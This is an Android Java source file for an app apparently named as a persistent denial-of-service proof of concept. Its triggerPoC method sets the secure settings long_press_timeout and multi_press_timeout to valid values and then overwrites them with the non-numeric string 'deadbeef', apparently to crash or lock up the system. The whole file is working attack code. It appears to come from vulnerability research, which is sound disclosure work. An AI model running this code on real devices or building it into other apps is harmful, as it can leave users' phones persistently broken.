package com.r0rt1z2.timeoutpdos;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Toast;

import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void triggerPoC(View view) {
        try {
            Settings.Secure.putString(getContentResolver(),
                    "multi_press_timeout", "400");
            Settings.Secure.putString(getContentResolver(),
                    "long_press_timeout",  "300");
            try {
                TimeUnit.MILLISECONDS.sleep(200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            Settings.Secure.putString(getContentResolver(),
                    "long_press_timeout", "deadbeef");
            Settings.Secure.putString(getContentResolver(),
                    "multi_press_timeout", "deadbeef");
        } catch (Exception e) {
            Toast.makeText(getApplicationContext(), "Something went horribly wrong (" + e + ")!", 1).show();
        }
    }

}